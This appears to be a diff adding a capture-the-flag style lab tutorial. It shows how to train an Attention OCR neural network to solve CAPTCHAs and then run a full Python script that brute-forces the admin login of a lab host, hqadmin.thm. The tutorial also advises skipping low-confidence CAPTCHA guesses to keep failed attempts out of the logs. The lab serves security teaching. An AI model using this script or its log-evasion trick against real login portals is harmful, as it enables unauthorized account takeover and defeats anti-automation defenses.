@@ -1,0 +1,212 @@
+Training our CNN
+
+Now that we’ve covered the basics, let’s take a look at what will be required to train and use our own CNN to crack the CAPTCHAs. Please note that the following steps have already been performed for you. The next steps will be to perform in the Hosting the Model section. However, understanding how training works is an important aspect so please follow along and attempt the commands given.
+
+We will be making use of the Attention OCR for our CNN model. This CNN structure has a lot more going on, such as LSTMs and sliding windows, but we won’t dive deeper into these steps in this instance. The only thing to note is that we have a sliding window, which allows us to read one character at a time instead of having to solve the entire CAPTCHA in one go.
+
+We’ll be making use of the same steps followed to create CAPTCHA22, which is a Python Pip package that can be used to host a CAPTCHA-cracking server. If you’re interested in understanding how this works, you can have a read here. While you can try to run all this software yourself, most of the ML component runs on a very specific version of TensorFlow. Therefore, making use of the VM attached to the task is recommended.
+
+In order to crack CAPTCHAs, we will have to go through the following steps:
+
+    Gather CAPTCHAs so we can create labelled data
+    Label the CAPTCHAs to use in a supervised learning model
+    Train our CAPTCHA-cracking CNN
+    Verify and test our CAPTCHA-cracking CNN
+    Export and host the trained model so we can feed it CAPTCHAs to solve
+    Create and execute a brute force script that will receive the CAPTCHA, pass it on to be solved, and then run the brute force attack
+
+Steps 1–4 are quite taxing, so they have already been completed for you. We’ll do a quick recap of what these steps involve before moving on to hosting the model and cracking some CAPTCHAs!
+
+To do this, you have to start the Docker container. In a terminal window, execute the following command:
+
+docker run -d -v /tmp/data:/tempdir/ aocr/full
+
+This will start a Docker container that has TensorFlow and AOCR already installed for you. You will need to connect to this container for the next few steps. First, you’ll need to find the container’s ID using the following command:
+
+docker ps
+
+Take note of your container’s ID and run the following command:
+
+docker exec -it CONTAINER_ID /bin/bash
+
+This will connect you to the container. You can now navigate to the following directory for the next few steps:
+
+cd /ocr/
+Gathering Training Data
+
+In order to train our CAPTCHA-cracking CNN, we first have to create a dataset that can be used for training. Let’s take a look at the authentication portal for HQ admin. Open http://hqadmin.thm:8000 in a browser window in the VM and you’ll see the following authentication page:
+
+Website Authentication Page
+
+As we can see, the authentication portal embeds a CAPTCHA image. We can get the raw image using a simple cURL command from a normal terminal window:
+
+curl http://hqadmin.thm:8000/
+
+In the output, you’ll see the base64 encoded version of the CAPTCHA image. We can write a script that will download this image and then prompt us to provide the answer for the CAPTCHA to store in a training dataset. This has already been done for you. You can view the stored data using the following command in the Docker container:
+
+ls -alh raw_data/dataset/
+Creating the Training Dataset
+
+Next, we need to create the training dataset in a format that AOCR can use. This requires us to create a simple text file that lists the path for each CAPTCHA and the correct answer. A script was used to create this text file and can be found under the labelling directory. You can use the following command to view the text file that was created:
+
+cat labels/training.txt
+
+Once we have our text file, it has to be converted into a TensorFlow record that can be used for training. This has already been done for you, but you can use the following command to create the dataset:
+
+aocr dataset ./labels/training.txt ./training.tfrecords
+
+As mentioned before, this has already been done for you and is stored in the labels directory. We have created two datasets: one for training and one for testing. As mentioned in the introduction to machine learning task (Day 14), we need fresh data that our CNN has never seen before to test and verify that the model has been trained accurately – not overtrained. Just as in the previous task, we’ll only use the training dataset to train the model and then the testing dataset to test its accuracy.
+Training and Testing the CNN
+
+Finally, we can start training our model. This has already been done for you, but with all the preparation completed, you would be able to use this command to start the training:
+
+cd labels && aocr train training.tfrecords
+
+Training will now begin! Once the training has completed a couple of steps, stop it by pressing Ctrl+C. Let’s take a look at one of the output lines from running the training:
+
+2023-10-24 05:31:38,766 root INFO Step 1: 10.058s, loss: 0.002588, perplexity: 1.002592.
+
+In each of these steps, the CNN is trained on all of our inputs. Similar to what was discussed in the introduction to machine learning task, each image is given as an input to the CNN, which will then make a prediction on the numbers that are present in the CAPTCHA. We then provide feedback to the CNN on how accurate its predictions are. This process is performed for each image in our training dataset to complete one step of the training. The output from aocr shows us how long it took to perform this round of training and provides feedback on the loss and perplexity values:
+
+    Loss: Loss is the CNN’s prediction error. The closer the value is to 0, the smaller our prediction error. If you were to start training from scratch, the loss value would be incredibly high for the first couple of rounds until the network is trained. Any loss value below 0.005 would show that the network has either completed its learning process or has overtrained on the dataset.
+    Perplexity: Perplexity refers to how uncertain the CNN is in its prediction. The closer the value is to 1, the more certain the CNN is that its prediction is correct. Consider how “perplexed” the CNN would be seeing the image for the first time; seeing something new would be perplexing! But as the network becomes more familiar with the images, it’s almost as if you can’t show it anything new. Any value below 1.005 would be considered a trained (or overtrained) CNN.
+
+As the CNN has already been trained for you, you can now test the CNN by running:
+
+aocr test testing.tfrecords
+
+Testing will now begin! Once a couple of testing steps are complete, you can stop it once again using Ctrl+C. Let’s take a look at two of the lines:
+Terminal
+
+2023-10-24 06:02:14,623 root  INFO     Step 19 (0.079s). Accuracy: 100.00%, loss: 0.000448, perplexity: 1.00045, probability: 99.73% 100% (37469)
+2023-10-24 06:02:14,690 root  INFO     Step 20 (0.066s). Accuracy: 99.00%, loss: 0.673766, perplexity: 1.96161, probability: 97.93%  80% (78642 vs 78542)
+
+As you can see from the testing time, running a single image sample through the CNN is significantly faster than training it on the entire dataset. This is one of the true advantages of neural networks. Once training has been completed, the network is usually quick to provide a prediction. As we can see from the predictions provided at the end of the lines, one of the CAPTCHA predictions was completely correct, whereas another was a prediction error, mistaking a 5 for a 6.
+
+If you compare the loss and perplexity values of the two samples, you will see that the CNN is uncertain about its answer. We can actually use this to our advantage when performing live predictions. We can create a discrepancy between CAPTCHA prediction accuracy and CAPTCHA submission accuracy simply by not submitting the CAPTCHAs that we are too uncertain about. Instead, we can request a new CAPTCHA. This enables us to change the OpSec of our attack, as the logs won’t show a significant amount of entries for incorrect CAPTCHA submissions.
+
+We could even take this a step further and save the CAPTCHA images that were incorrect on submission. We can then label these manually and retrain our CNN to further improve its accuracy. This way, we can create a super CAPTCHA-cracking engine! You can read more about this process here.
+Hosting Our CNN Model
+
+Now that we’ve trained our CNN, we’ll need to host the CNN model to send it CAPTCHAs through our brute forcing script. For this, we will use TensorFlow Serving.
+
+Once a CNN has been trained, we can export the weights of the different nodes. This allows us to recreate the trained network at any time. An export of the trained CNN has already been created for you under the /ocr/model/ directory. We’ll now export that model from the Docker container using the following command:
+
+cd /ocr/ && cp -r model /tempdir/
+
+Once that’s complete, you can exit the Docker container terminal (use the exit command) and kill it using the following command (you can reuse docker ps to get the container ID):
+
+docker kill CONTAINER_ID
+
+TensorFlow Serving will run in a Docker container. This container will then expose an API that we can use to interface with the hosted model to send it a CAPTCHA for prediction. You can start the Serving container using the following command:
+
+docker run -t --rm -p 8501:8501 -v /tmp/data/model/exported-model:/models/ -e MODEL_NAME=ocr tensorflow/serving
+
+This will start a new hosting of the OCR model that was exported from the AOCR training Docker container. We can connect to the model through the API hosted on http://localhost:8501/v1/models/ocr/
+
+Now we’re finally ready to help McSkidy regain access to the HQ admin portal!
+Brute Forcing the Admin Panel
+
+We are now ready for our brute force attack. You’ve been provided with the custom script that we will use. You can find the custom script and password list on the desktop in the bruteforcer folder. Let’s take a look at the script:
+
+'''
+#Import libraries
+import requests
+import base64
+import json
+from bs4 import BeautifulSoup
+
+username = "admin"
+passwords = []
+
+#URLs for our requests
+website_url = "http://hqadmin.thm:8000"
+model_url = "http://localhost:8501/v1/models/ocr:predict"
+
+#Load in the passwords for brute forcing
+with open("passwords.txt", "r") as wordlist:
+    lines = wordlist.readlines()
+    for line in lines:
+        passwords.append(line.replace("\n",""))
+
+
+access_granted = False
+count = 0
+
+#Run the brute force attack until we are out of passwords or have gained access
+while(access_granted == False and count < len(passwords)):
+    #This will run a brute force for each password
+    password = passwords[count]
+
+    #First, we connect to the webapp so we can get the CAPTCHA. We will use a session so cookies are taken care of for us
+    sess = requests.session()
+    r = sess.get(website_url)
+    
+    #Use soup to parse the HTML and extract the CAPTCHA image
+    soup = BeautifulSoup(r.content, 'html.parser')
+    img = soup.find("img")    
+    encoded_image = img['src'].split(" ")[1]
+    
+    #Build the JSON request to send to the CAPTCHA predictor
+    model_data = {
+        'signature_name' : 'serving_default',
+        'inputs' : {'input' : {'b64' : encoded_image} }
+        }
+        
+    #Send the CAPTCHA prediction request and load the response
+    r = requests.post(model_url, json=model_data)
+    prediction = r.json()
+    probability = prediction["outputs"]["probability"]
+    answer = prediction["outputs"]["output"]
+
+    #We can increase our guessing accuracy by only submitting the answer if we are more than 90% sure
+    if (probability < 0.90):
+        #If lower than 90%, no submission of CAPTCHA
+        print ("[-] Prediction probability too low, not submitting CAPTCHA")
+        continue
+
+    #Otherwise, we are good to go with our brute forcer
+    #Build the POST data for our brute force attempt
+    website_data = {
+            'username' : username,
+            'password' : password,
+            'captcha' : answer,
+            'submit' : "Submit+Query"
+            }
+
+    #Submit our brute force attack
+    r = sess.post(website_url, data=website_data)
+
+    #Read the response and interpret the results of the brute force attempt
+    response = r.text
+
+    #If the response tells us that we submitted the wrong CAPTCHA, we have to try again with this password
+    if ("Incorrect CAPTCHA value supplied" in response):
+        print ("[-] Incorrect CAPTCHA value was supplied. We will resubmit this password")
+        continue
+    #If the response tells us that we submitted the wrong password, we can try with the next password
+    elif ("Incorrect Username or Password" in response):
+        print ("[-] Invalid credential pair -- Username: " + username + " Password: " + password)
+        count += 1
+    #Otherwise, we have found the correct password!
+    else:
+        print ("[+] Access Granted!! -- Username: " + username + " Password: " + password)
+        access_granted = True
+'''
+
+Let’s dive into what this script is doing:
+
+    First, we load the libraries that will be used. We’ll mainly make use of Python’s request library to make the web requests on our behalf.
+    Next, we load our password list, which will be used for the brute force attacks.
+    In a loop, we will perform our brute force attack, which consists of the following steps:
+        Make a request to the HQ admin portal to get the cookie values and CAPTCHA image.
+        Submit the CAPTCHA image to our hosted CNN model.
+        Determine if the prediction accuracy of the CNN model was high enough to submit the CAPTCHA attempt.
+        Submit a brute force request to the HQ admin portal with the username, password, and CAPTCHA attempt.
+        Read the response from the HQ admin portal to determine what to do next.
+
+Let’s run our brute force attack using the following command in a terminal window:
+
+cd ~/Desktop/bruteforcer && python3 bruteforce.py
+
+Let it run for a minute or two, and you will regain access to the HQ admin portal!
